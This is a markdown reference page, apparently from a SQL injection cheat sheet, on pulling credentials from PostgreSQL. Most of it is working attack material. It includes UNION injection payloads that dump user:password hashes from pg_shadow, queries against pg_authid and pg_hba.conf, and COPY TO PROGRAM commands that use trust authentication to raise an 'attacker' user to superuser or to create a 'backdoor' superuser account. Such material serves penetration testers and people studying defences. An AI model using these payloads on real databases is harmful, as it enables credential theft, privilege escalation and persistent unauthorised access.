---
title: Database Credentials
description: How to retrieve database credentials in PostgreSQL
category: Information Gathering
order: 9
tags: ["credentials", "authentication", "user data"]
lastUpdated: 2025-12-07
---

## Database Credentials

When performing SQL injection attacks against PostgreSQL, extracting database credentials can provide valuable information for further exploitation.

### Current User Information

| Information     | Query                                                        |
| --------------- | ------------------------------------------------------------ |
| Current User    | `SELECT user;`                                               |
| Current User    | `SELECT current_user;`                                       |
| Session User    | `SELECT session_user;`                                       |
| Superuser Check | `SELECT usesuper FROM pg_user WHERE usename = current_user;` |

### User Enumeration

```sql
-- List all database users
SELECT usename FROM pg_user;

-- List all roles
SELECT rolname FROM pg_roles;

-- Get user details (usecatupd column removed in PostgreSQL 10+)
SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user;  -- PostgreSQL < 10
SELECT usename, usecreatedb, usesuper FROM pg_user;             -- PostgreSQL 10+

-- Find superuser accounts
SELECT usename FROM pg_user WHERE usesuper = true;
```

### Password Hashes

PostgreSQL stores password hashes in the `pg_shadow` table (requires superuser):

```sql
-- Get password hashes (requires superuser privilege)
SELECT usename, passwd FROM pg_shadow;
```

The hash format depends on PostgreSQL version and configuration:

- `md5` + MD5 hash (older default)
- `SCRAM-SHA-256` hash (PostgreSQL 10+ default)

### Role and Privilege Information

```sql
-- Get role memberships
SELECT r.rolname, r.rolsuper, r.rolinherit, r.rolcreaterole,
       r.rolcreatedb, r.rolcanlogin
FROM pg_roles r;

-- Check if current user is superuser
SELECT current_setting('is_superuser');

-- Get granted roles
SELECT grantee, role_name
FROM information_schema.applicable_roles;
```

### Injection Examples

```sql
-- Get current user
' UNION SELECT NULL,current_user,NULL--

-- List all users
' UNION SELECT NULL,usename,NULL FROM pg_user--

-- Get user:password pairs (requires superuser)
' UNION SELECT NULL,usename||':'||passwd,NULL FROM pg_shadow--

-- Check if current user is superuser
' UNION SELECT NULL,usesuper::text,NULL FROM pg_user WHERE usename=current_user--

-- Find superusers
' UNION SELECT NULL,string_agg(usename,','),NULL FROM pg_user WHERE usesuper=true--
```

### Database Authentication Settings

```sql
-- Check authentication method (pg_hba.conf)
-- This requires reading the config file
SELECT current_setting('hba_file');
```

### pg_hba.conf Analysis

The `pg_hba.conf` file controls PostgreSQL authentication. Understanding it is critical for privilege escalation.

**Reading pg_hba.conf (requires file read permissions):**

```sql
-- Get pg_hba.conf location
SELECT current_setting('hba_file');
-- Example: /var/lib/postgresql/15/main/pg_hba.conf

-- Read pg_hba.conf (requires superuser or pg_read_server_files)
SELECT pg_read_file(current_setting('hba_file'));
```

**pg_hba.conf Format:**

```text
# TYPE  DATABASE  USER  ADDRESS       METHOD
local   all       all                 trust      # DANGEROUS!
host    all       all   127.0.0.1/32  md5
host    all       all   0.0.0.0/0     scram-sha-256
```

**Authentication Methods:**

| Method          | Security | Description                                 |
| --------------- | -------- | ------------------------------------------- |
| `trust`         | **NONE** | No password required - anyone can connect   |
| `peer`          | OS-based | Uses OS username (local connections only)   |
| `ident`         | OS-based | Uses ident server to verify OS username     |
| `md5`           | Low      | MD5 password hashing (vulnerable to replay) |
| `scram-sha-256` | High     | Modern password authentication              |
| `cert`          | High     | SSL certificate authentication              |
| `reject`        | N/A      | Always reject connection                    |

**Exploiting Trust Authentication:**

If local trust authentication is configured:

```sql
-- First, get command execution capability
GRANT pg_execute_server_program TO current_user;

-- Connect locally as superuser without password
COPY (SELECT '') TO PROGRAM 'psql -U postgres -c "ALTER USER attacker WITH SUPERUSER"';

-- Or create a backdoor user
COPY (SELECT '') TO PROGRAM 'psql -U postgres -c "CREATE USER backdoor WITH SUPERUSER PASSWORD ''secret''"';
```

**Checking Authentication Method via pg_hba_file_rules (PostgreSQL 10+):**

```sql
-- View parsed pg_hba.conf rules
SELECT line_number, type, database, user_name, address, auth_method
FROM pg_hba_file_rules;

-- Find trust authentication entries
SELECT * FROM pg_hba_file_rules WHERE auth_method = 'trust';

-- Find entries allowing any user
SELECT * FROM pg_hba_file_rules WHERE user_name = '{all}';
```

**Injection Examples for pg_hba Analysis:**

```sql
-- Check for pg_hba_file_rules view
' UNION SELECT 1, auth_method, 3 FROM pg_hba_file_rules LIMIT 1--

-- Find trust authentication
' UNION SELECT 1, type||':'||auth_method, 3 FROM pg_hba_file_rules WHERE auth_method='trust'--

-- Get all auth methods in use
' UNION SELECT 1, string_agg(DISTINCT auth_method, ','), 3 FROM pg_hba_file_rules--
```

### Password Authentication Details

**Password Storage in pg_authid:**

```sql
-- pg_authid contains all role information (superuser only)
SELECT rolname, rolpassword FROM pg_authid;

-- Password format examples:
-- MD5: md5 + md5(password + username) = md5a1b2c3d4...
-- SCRAM: SCRAM-SHA-256$iterations:salt$StoredKey:ServerKey
```

**Password Hash Formats:**

| Format        | Example                           | Notes                                 |
| ------------- | --------------------------------- | ------------------------------------- |
| MD5           | `md5a1b2c3d4e5f6...`              | 35 chars, starts with "md5"           |
| SCRAM-SHA-256 | `SCRAM-SHA-256$4096:salt$key:key` | PostgreSQL 10+ default                |
| Plaintext     | (raw password)                    | Only if `password_encryption = plain` |

**Checking Password Encryption Setting:**

```sql
-- Check current password encryption method
SELECT current_setting('password_encryption');
-- Returns: md5, scram-sha-256, or plain

-- Check when passwords were last set
SELECT rolname, rolpassword IS NOT NULL as has_password
FROM pg_authid WHERE rolcanlogin;
```

### Connection String Extraction

If you find credentials, test them with connection strings:

```sql
-- Using dblink to test credentials
SELECT dblink_connect('host=localhost dbname=postgres user=admin password=secret');

-- Using postgres_fdw
CREATE SERVER target FOREIGN DATA WRAPPER postgres_fdw
OPTIONS (host 'localhost', dbname 'postgres');

CREATE USER MAPPING FOR current_user SERVER target
OPTIONS (user 'admin', password 'secret');
```

### Notes

- `pg_shadow` requires superuser privileges to access
- `pg_user` is accessible but doesn't contain password hashes
- PostgreSQL 10+ uses SCRAM-SHA-256 by default, which is more secure than MD5
- Password column may be NULL for users without password authentication

For more information on password hashing and cracking, see the related entries on [Password Hashing](/postgresql/password-hashing) and [Password Cracking](/postgresql/password-cracking).
